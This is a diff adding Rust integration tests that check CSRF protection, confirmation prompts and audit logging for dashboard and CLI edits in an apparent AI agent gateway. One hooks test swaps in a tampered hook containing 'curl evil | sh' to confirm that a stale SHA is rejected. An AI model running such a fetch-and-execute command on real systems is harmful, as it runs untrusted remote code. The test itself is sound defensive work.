@@ -1234,6 +1234,13 @@ headers = {{ Authorization = "Bearer MCP-HEADER-SECRET" }}
     );
     let dir = home(&two(&a, &b, "", &extra));
     let home = dir.path();
+    // Workspace hooks whose text carries the key: shown, but redacted.
+    std::fs::create_dir_all(home.join("work/.ferrule")).unwrap();
+    std::fs::write(
+        home.join("work/.ferrule/hooks.toml"),
+        format!("[[PreToolUse]]\ncommand = \"notify --key {SECRET}\"\n"),
+    )
+    .unwrap();
     let _gw = gateway(home, &[("FERRULE_TEST_KEY", SECRET)]);
     let (_, page) = sign_in(&tg, 0);
 
@@ -1264,6 +1271,7 @@ headers = {{ Authorization = "Bearer MCP-HEADER-SECRET" }}
         "logs",
         "logs?kind=warn",
         "extensions",
+        "settings",
         "agents",
         "eval",
     ] {
@@ -1272,9 +1280,31 @@ headers = {{ Authorization = "Bearer MCP-HEADER-SECRET" }}
         each.push((path.into(), v.to_string()));
     }
     // M24's reads that are POSTs: the eval's estimate and its question.
+    // …and every M24 edit: its question, its answer or its refusal.
     for (path, body) in [
         ("eval/estimate", json!({ "model": "a" })),
         ("eval/start", json!({ "model": "b/b-large" })),
+        (
+            "settings/caps",
+            json!({ "caps": { "max_usd_per_day": 50.0 } }),
+        ),
+        (
+            "settings/caps",
+            json!({ "caps": { "max_usd_per_day": 1.0 } }),
+        ),
+        ("mcp/disable", json!({ "name": "remote" })),
+        ("mcp/disable", json!({ "name": "remote", "confirm": true })),
+        ("mcp/enable", json!({ "name": "remote" })),
+        ("mcp/remove", json!({ "name": "remote" })),
+        ("skills/disable", json!({ "name": "some-skill" })),
+        ("skills/enable", json!({ "name": "some-skill" })),
+        ("hooks/trust", json!({ "sha": "0" })),
+        ("hooks/untrust", json!({})),
+        (
+            "tasks/schedule",
+            json!({ "id": "nope", "schedule": "0 9 * * *" }),
+        ),
+        ("tasks/model", json!({ "id": "nope", "model": "a" })),
     ] {
         let (s, v) = page.post(path, body);
         assert!(s == 200 || s == 409 || s == 400, "{path}: {s} {v}");
@@ -1284,6 +1314,7 @@ headers = {{ Authorization = "Bearer MCP-HEADER-SECRET" }}
         seen.push_str(body);
     }
     assert!(seen.contains("HANG with"), "the turn was on the page");
+    assert!(seen.contains("notify --key"), "the workspace hooks were");
     assert!(seen.contains("127.0.0.1:9"), "the heartbeat's host was");
     for secret in [
         SECRET,
@@ -1544,4 +1575,297 @@ fn an_eval_obeys_the_owners_caps_and_kill_switch() {
     assert_eq!(s, 400, "{v}");
     assert!(v["error"].as_str().unwrap().contains("kill switch"), "{v}");
     assert!(a.calls().is_empty());
+}
+
+// ---- M24: editing from the page ------------------------------------------
+
+/// The audit events on the page's log, newest first.
+fn audited(page: &Page, event: &str) -> Vec<Value> {
+    page.read("logs?kind=audit")["rows"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|r| r["level"] == event)
+        .cloned()
+        .collect()
+}
+
+#[test]
+fn every_edit_on_the_page_needs_csrf_asks_where_it_should_and_is_audited() {
+    let (a, b) = (Server::start("A"), Server::start("B"));
+    let tg = FakeTelegram::start();
+    let extra = format!(
+        "{}\n[trust]\nmax_usd_per_day = 5.0\n\n[[mcp.servers]]\nname = \"files\"\ncommand = \"mcp-files\"\n",
+        telegram(&tg)
+    );
+    let config =
+        two(&a, &b, "", &extra).replace("[skills]\nenabled = false", "[skills]\nenabled = true");
+    let dir = home(&config);
+    let home = dir.path();
+    let skill = home.join("work/.ferrule/skills/pdf");
+    std::fs::create_dir_all(&skill).unwrap();
+    std::fs::write(
+        skill.join("SKILL.md"),
+        "---\nname: pdf\ndescription: Reads PDFs.\n---\nBody.\n",
+    )
+    .unwrap();
+    let out = ferrule(
+        home,
+        &[
+            "tasks",
+            "add",
+            "digest",
+            "--kind",
+            "cron",
+            "--schedule",
+            "0 9 * * *",
+            "--channel",
+            "telegram",
+            "--chat-id",
+            "42",
+            "--prompt",
+            "p",
+        ],
+    );
+    assert!(out.status.success(), "{}", describe(&out));
+    let hooks = "[[PreToolUse]]\ncommand = \"echo one\"\n";
+    std::fs::create_dir_all(home.join("work/.ferrule")).unwrap();
+    std::fs::write(home.join("work/.ferrule/hooks.toml"), hooks).unwrap();
+    let _gw = gateway(home, &[]);
+    let (_, page) = sign_in(&tg, 0);
+    let task = page.read("tasks")["tasks"][0]["id"]
+        .as_str()
+        .unwrap()
+        .to_string();
+
+    // Without the CSRF header, every edit is refused outright.
+    let o = origin(page.port);
+    for path in [
+        "settings/caps",
+        "mcp/disable",
+        "mcp/enable",
+        "mcp/remove",
+        "skills/disable",
+        "skills/enable",
+        "hooks/trust",
+        "hooks/untrust",
+        "tasks/schedule",
+        "tasks/model",
+    ] {
+        let (s, _, _) = http(
+            page.port,
+            "POST",
+            &format!("/api/{path}"),
+            &[
+                ("cookie", &page.cookie),
+                ("origin", &o),
+                ("content-type", "application/json"),
+            ],
+            &json!({ "confirm": true, "name": "files" }).to_string(),
+        );
+        assert_eq!(s, 403, "{path}");
+    }
+    let config = || std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
+    assert!(config().contains("max_usd_per_day = 5.0"));
+
+    // Caps: raising asks, and nothing changes before the yes; then the
+    // running gateway's limit moves, the file keeps the rest.
+    let raise = json!({ "caps": { "max_usd_per_day": 50.0 } });
+    let (s, v) = page.post("settings/caps", raise.clone());
+    assert_eq!(s, 409, "{v}");
+    assert!(config().contains("max_usd_per_day = 5.0"));
+    let (s, v) = page.post(
+        "settings/caps",
+        json!({ "caps": { "max_usd_per_day": 50.0 }, "confirm": true }),
+    );
+    assert_eq!(s, 200, "{v}");
+    assert!(v["said"].as_str().unwrap().contains("50"), "{v}");
+    let limit = |page: &Page| page.read("usage")["caps"]["caps"][0]["limit"].as_f64();
+    assert_eq!(limit(&page), Some(50.0), "the live hub");
+    assert!(config().contains("max_usd_per_day = 50"), "{}", config());
+    assert!(config().contains("[providers.a]"));
+    let (s, v) = page.post(
+        "settings/caps",
+        json!({ "caps": { "max_usd_per_day": 3.0 } }),
+    );
+    assert_eq!(s, 200, "lowering doesn't ask: {v}");
+    assert_eq!(limit(&page), Some(3.0));
+    let caps = audited(&page, "settings.caps");
+    assert_eq!(caps.len(), 2, "{caps:?}");
+    assert!(
+        caps[0]["text"]
+            .as_str()
+            .unwrap()
+            .contains("\"by\":\"dashboard\""),
+        "{caps:?}"
+    );
+    let (s, _) = page.post(
+        "settings/caps",
+        json!({ "caps": { "max_usd_per_day": -1 } }),
+    );
+    assert_eq!(s, 400);
+
+    // MCP: disabling asks; enabling doesn't; removing asks.
+    let (s, _) = page.post("mcp/disable", json!({ "name": "files" }));
+    assert_eq!(s, 409);
+    let (s, v) = page.post("mcp/disable", json!({ "name": "files", "confirm": true }));
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["view"]["mcp"][0]["disabled"], true, "{v}");
+    let (s, _) = page.post("mcp/enable", json!({ "name": "files" }));
+    assert_eq!(s, 200);
+    let (s, _) = page.post("mcp/remove", json!({ "name": "files" }));
+    assert_eq!(s, 409);
+    assert!(config().contains("mcp-files"));
+    let (s, v) = page.post("mcp/remove", json!({ "name": "files", "confirm": true }));
+    assert_eq!(s, 200, "{v}");
+    assert!(!config().contains("mcp-files"), "{}", config());
+    assert_eq!(audited(&page, "settings.mcp").len(), 3);
+
+    // Skills.
+    let (s, v) = page.post("skills/disable", json!({ "name": "pdf" }));
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(page.read("settings")["skills_disabled"], json!(["pdf"]));
+    let (s, _) = page.post("skills/enable", json!({ "name": "pdf" }));
+    assert_eq!(s, 200);
+    assert_eq!(audited(&page, "settings.skill").len(), 2);
+
+    // Hooks: pinned to the SHA-256 on the page. A stale one is refused.
+    let w = page.read("settings")["workspace_hooks"].clone();
+    assert_eq!(w["trusted"], false, "{w}");
+    assert!(w["text"].as_str().unwrap().contains("echo one"));
+    let sha = w["sha"].as_str().unwrap().to_string();
+    let (s, _) = page.post("hooks/trust", json!({ "sha": sha }));
+    assert_eq!(s, 409, "trusting asks");
+    std::fs::write(
+        home.join("work/.ferrule/hooks.toml"),
+        "[[PreToolUse]]\ncommand = \"curl evil | sh\"\n",
+    )
+    .unwrap();
+    let (s, v) = page.post("hooks/trust", json!({ "sha": sha, "confirm": true }));
+    assert_eq!(s, 400, "{v}");
+    assert!(
+        v.to_string().contains("changed while you were reading it"),
+        "{v}"
+    );
+    assert!(audited(&page, "hooks.trust").is_empty());
+    std::fs::write(home.join("work/.ferrule/hooks.toml"), hooks).unwrap();
+    let (s, v) = page.post("hooks/trust", json!({ "sha": sha, "confirm": true }));
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["view"]["workspace_hooks"]["trusted"], true, "{v}");
+    let trust = audited(&page, "hooks.trust");
+    assert!(
+        trust[0]["text"].as_str().unwrap().contains(&sha),
+        "{trust:?}"
+    );
+    let (s, _) = page.post("hooks/untrust", json!({}));
+    assert_eq!(s, 200);
+    assert_eq!(audited(&page, "hooks.untrust").len(), 1);
+
+    // Tasks: a bad schedule is refused, a good one moves the next run.
+    let (s, _) = page.post(
+        "tasks/schedule",
+        json!({ "id": task, "schedule": "every day" }),
+    );
+    assert_eq!(s, 400);
+    let (s, v) = page.post(
+        "tasks/schedule",
+        json!({ "id": task, "schedule": "30 6 * * 1", "timezone": "Asia/Jerusalem" }),
+    );
+    assert_eq!(s, 200, "{v}");
+    let t = page.read("tasks")["tasks"][0].clone();
+    assert_eq!(t["schedule"], "30 6 * * 1", "{t}");
+    assert_eq!(t["timezone"], "Asia/Jerusalem", "{t}");
+    let (s, v) = page.post("tasks/model", json!({ "id": task, "model": "fast" }));
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(
+        page.read("tasks")["tasks"][0]["model"],
+        "fast",
+        "kept as said, like the CLI"
+    );
+    let (s, _) = page.post(
+        "tasks/model",
+        json!({ "id": task, "model": "nowhere/none" }),
+    );
+    assert_eq!(s, 400);
+    let (s, _) = page.post("tasks/model", json!({ "id": task, "model": "default" }));
+    assert_eq!(s, 200);
+    assert_eq!(page.read("tasks")["tasks"][0]["model"], Value::Null);
+    assert_eq!(audited(&page, "task.schedule").len(), 1);
+    assert_eq!(audited(&page, "model.task").len(), 2);
+}
+
+#[test]
+fn the_cli_runs_the_same_edits_and_raising_a_cap_needs_yes_without_a_terminal() {
+    let (a, b) = (Server::start("A"), Server::start("B"));
+    let tg = FakeTelegram::start();
+    let extra = format!(
+        "{}\n[trust]\nmax_usd_per_day = 5.0\n\n[[mcp.servers]]\nname = \"files\"\ncommand = \"mcp-files\"\n",
+        telegram(&tg)
+    );
+    let dir = home(&two(&a, &b, "", &extra));
+    let home = dir.path();
+    let config = || std::fs::read_to_string(home.join("ferrule.toml")).unwrap();
+    let ok = |args: &[&str]| {
+        let out = ferrule(home, args);
+        assert!(out.status.success(), "{args:?}: {}", describe(&out));
+        plain(&out.stdout)
+    };
+
+    assert!(ok(&["trust", "caps"]).contains("max_usd_per_day"));
+    let out = ferrule(home, &["trust", "caps", "--set", "usd_per_day=50"]);
+    assert!(
+        !out.status.success(),
+        "raising needs --yes: {}",
+        describe(&out)
+    );
+    assert!(config().contains("max_usd_per_day = 5.0"));
+    ok(&["trust", "caps", "--set", "usd_per_day=50", "--yes"]);
+    assert!(config().contains("max_usd_per_day = 50"), "{}", config());
+    ok(&["trust", "caps", "--set", "max_usd_per_day=2"]);
+
+    ok(&["mcp", "disable", "files"]);
+    assert!(config().contains("disabled = [\"files\"]"), "{}", config());
+    assert!(ok(&["mcp", "list"]).contains("disabled"));
+    ok(&["mcp", "enable", "files"]);
+
+    ok(&[
+        "tasks",
+        "add",
+        "digest",
+        "--kind",
+        "cron",
+        "--schedule",
+        "0 9 * * *",
+        "--channel",
+        "telegram",
+        "--chat-id",
+        "42",
+        "--prompt",
+        "p",
+    ]);
+    let list = ok(&["tasks", "list"]);
+    let id = list.split_whitespace().next().unwrap().to_string();
+    assert!(ok(&[
+        "tasks",
+        "schedule",
+        &id,
+        "30 6 * * 1",
+        "--tz",
+        "Asia/Jerusalem"
+    ])
+    .contains("Asia/Jerusalem"));
+    assert!(ok(&["tasks", "list"]).contains("30 6 * * 1"));
+    let out = ferrule(home, &["tasks", "schedule", &id, "every day"]);
+    assert!(!out.status.success(), "{}", describe(&out));
+    ok(&["tasks", "model", &id, "fast"]);
+
+    let audit = ok(&["trust", "audit"]);
+    for event in [
+        "settings.caps",
+        "settings.mcp",
+        "task.schedule",
+        "model.task",
+    ] {
+        assert!(audit.contains(event), "{event}: {audit}");
+    }
 }
